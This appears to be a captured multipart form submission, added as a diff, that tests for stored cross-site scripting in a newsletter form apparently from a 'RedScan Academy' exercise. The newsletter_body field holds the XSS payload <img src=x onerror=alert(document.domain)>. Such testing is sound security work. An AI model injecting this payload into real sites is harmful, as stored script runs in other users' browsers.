@@ -1,0 +1,17 @@
+------geckoformboundaryc428bac4a9d187fcd53f69b042b020e0
+Content-Disposition: form-data; name="ID"
+
+1
+------geckoformboundaryc428bac4a9d187fcd53f69b042b020e0
+Content-Disposition: form-data; name="title"
+
+Teste Stored XSS - RedScan Academy
+------geckoformboundaryc428bac4a9d187fcd53f69b042b020e0
+Content-Disposition: form-data; name="cc"
+
+
+------geckoformboundaryc428bac4a9d187fcd53f69b042b020e0
+Content-Disposition: form-data; name="newsletter_body"
+
+<img src=x onerror=alert(document.domain)>
+------geckoformboundaryc428bac4a9d187fcd53f69b042b020e0--
